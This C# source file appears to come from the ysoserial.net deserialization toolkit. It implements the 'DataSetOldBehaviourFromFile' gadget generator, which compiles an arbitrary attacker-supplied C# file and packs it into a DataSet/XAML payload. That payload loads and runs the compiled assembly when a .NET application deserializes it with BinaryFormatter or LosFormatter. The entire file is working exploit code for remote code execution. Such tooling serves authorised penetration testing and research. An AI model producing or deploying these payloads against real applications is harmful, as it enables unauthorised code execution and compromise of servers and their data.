﻿using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using ysoserial.Generators;
using ysoserial.Helpers;
using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysoserial.Generators
{
    internal class DataSetOldBehaviourFromFileGenerator : GenericGenerator
    {
        public override string AdditionalInfo()
        {
            var info = "Another variant of the DataSetOldBehaviour gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'";
            return info;
        }

        public override string Name()
        {
            return "DataSetOldBehaviourFromFile";
        }

        public override string Finders()
        {
            return "Steven Seeley, Markus Wulftange";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "LosFormatter" };
        }

        public override string SupportedBridgedFormatter()
        {
            // We haven't created it in a way to accept arbitrary XAML yet...
            return Formatters.None;
        }

        string spoofedAssembly = "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"x=", "The numerical internal gadget choice to use: 1=TypeConfuseDelegate, 2=TextFormattingRunProperties (default: 1 [TypeConfuseDelegate])", v => spoofedAssembly = v }
            };

            return options;
        }

        string xmlSchema = "<?xml version=\"1.0\" encoding=\"utf-16\"?>\r\n<xs:schema id=\"ds\" xmlns=\"\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\">\r\n  <xs:element name=\"ds\" msdata:IsDataSet=\"true\" msdata:UseCurrentLocale=\"true\">\r\n    <xs:complexType>\r\n      <xs:choice minOccurs=\"0\" maxOccurs=\"unbounded\">\r\n        <xs:element name=\"tbl\">\r\n          <xs:complexType>\r\n            <xs:sequence>\r\n   <xs:element name=\"objwrapper\" msdata:DataType=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" type=\"xs:anyType\" msdata:targetNamespace=\"\" minOccurs=\"0\" />\r\n            </xs:sequence>\r\n          </xs:complexType>\r\n        </xs:element>\r\n      </xs:choice>\r\n    </xs:complexType>\r\n  </xs:element>\r\n</xs:schema>";

        string xmlXamlParser = "<diffgr:diffgram xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\" xmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\"><ds><tbl diffgr:id=\"tbl1\" msdata:rowOrder=\"0\"><objwrapper xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><ExpandedElement /><ProjectedProperty0><ObjectInstance xsi:type=\"XamlReader\" /><MethodName>Parse</MethodName><MethodParameters><anyType xsi:type=\"xsd:string\">%ResourceDictionary%</anyType></MethodParameters></ProjectedProperty0></objwrapper></tbl></ds></diffgr:diffgram>";

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            var files = inputArgs.Cmd;
            byte[] asmData = LocalCodeCompiler.CompileToAsmBytes(files);
            var asmDataList = asmData.ToList();
            var xml_asmDataList = SerializersHelper.XmlSerializer_serialize(asmDataList);
            xml_asmDataList = Regex.Replace(xml_asmDataList, @"<\?xml[^>]*>", "");
            xml_asmDataList = Regex.Replace(xml_asmDataList, @"</?ArrayOfUnsignedByte[^>]*>", "");
            xml_asmDataList = Regex.Replace(xml_asmDataList, @"\s", "");
            xml_asmDataList = xml_asmDataList.Replace("unsignedByte", "s:Byte");

            string xmlResourceDict = @"<ResourceDictionary
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns:s=""clr-namespace:System;assembly=mscorlib""
xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib""
>
    <ObjectDataProvider x:Key=""asmLoad"" ObjectType=""{x:Type r:Assembly}"" MethodName=""Load"">
        <ObjectDataProvider.MethodParameters>
            <x:Array Type=""s:Byte"">
            " + xml_asmDataList + @"
            </x:Array>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""types"" ObjectInstance=""{StaticResource asmLoad}"" MethodName=""GetTypes"">
        <ObjectDataProvider.MethodParameters/>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""firstType"" ObjectInstance=""{StaticResource types}"" MethodName=""GetValue"">
        <ObjectDataProvider.MethodParameters>
            <s:Int32>0</s:Int32>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""createInstance"" ObjectInstance=""{StaticResource firstType}"" MethodName=""InvokeMember"">
        <ObjectDataProvider.MethodParameters>
            <x:Null/>
            <r:BindingFlags>512</r:BindingFlags>
            <x:Null/>
            <x:Null/>
            <x:Null/>
            <x:Null/>
            <x:Null/>
            <x:Null/>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

            if (inputArgs.Minify)
            {
                if (inputArgs.UseSimpleType)
                {
                    xmlSchema = XmlMinifier.Minify(xmlSchema, new string[] { }, new string[] { });
                    xmlXamlParser = XmlMinifier.Minify(xmlXamlParser, new string[] { }, new string[] { });
                    xmlResourceDict = XmlMinifier.Minify(xmlResourceDict, new string[] { }, new string[] { });
                }
                else
                {
                    xmlSchema = XmlMinifier.Minify(xmlSchema, new string[] { }, new string[] { });
                    xmlXamlParser = XmlMinifier.Minify(xmlXamlParser, new string[] { }, new string[] { });
                    xmlResourceDict = XmlMinifier.Minify(xmlResourceDict, new string[] { }, new string[] { });
                }
            }

            xmlXamlParser = xmlXamlParser.Replace("%ResourceDictionary%", "<![CDATA[" + xmlResourceDict + "]]>");
            xmlSchema = CommandArgSplitter.JsonStringEscape(xmlSchema);
            xmlXamlParser = CommandArgSplitter.JsonStringEscape(xmlXamlParser);

            var bf_json = @"[{""Id"": 1,
    ""Data"": {
      ""$type"": ""SerializationHeaderRecord"",
      ""binaryFormatterMajorVersion"": 1,
      ""binaryFormatterMinorVersion"": 0,
      ""binaryHeaderEnum"": 0,
      ""topId"": 1,
      ""headerId"": -1,
      ""majorVersion"": 1,
      ""minorVersion"": 0
}},{""Id"": 2,
    ""TypeName"": ""Assembly"",
    ""Data"": {
      ""$type"": ""BinaryAssembly"",
      ""assemId"": 2,
      ""assemblyString"": ""%SPOOFED%""
}},{""Id"": 3,
    ""TypeName"": ""ObjectWithMapTypedAssemId"",
    ""Data"": {
      ""$type"": ""BinaryObjectWithMapTyped"",
      ""binaryHeaderEnum"": 5,
      ""objectId"": 1,
      ""name"": ""System.Data.DataSet,System.Data"",
      ""numMembers"": 2,
      ""memberNames"":[""XmlSchema"",""XmlDiffGram""],
      ""binaryTypeEnumA"":[1,1],
      ""typeInformationA"":[null,null],
      ""typeInformationB"":[null,null],
      ""memberAssemIds"":[0,0],
      ""assemId"": 2
}},{""Id"": 5,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 4,
      ""value"": """ + xmlSchema + @"""
}},{""Id"": 6,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 5,
      ""value"": """ + xmlXamlParser + @"""
}},{""Id"": 12,
    ""TypeName"": ""MessageEnd"",
    ""Data"": {
      ""$type"": ""MessageEnd""
}}]";

            bf_json = bf_json.Replace("%SPOOFED%", spoofedAssembly);

            MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(bf_json);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
            {
                //BinaryFormatter
                if (inputArgs.Test)
                {
                    try
                    {
                        ms_bf.Position = 0;
                        SerializersHelper.BinaryFormatter_deserialize(ms_bf);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return ms_bf.ToArray();
            }
            else if(formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                // LosFormatter
                MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);

                if (inputArgs.Test)
                {
                    try
                    {
                        ms_bf.Position = 0;
                        SerializersHelper.LosFormatter_deserialize(ms_lf.ToArray());
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return ms_lf.ToArray();
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
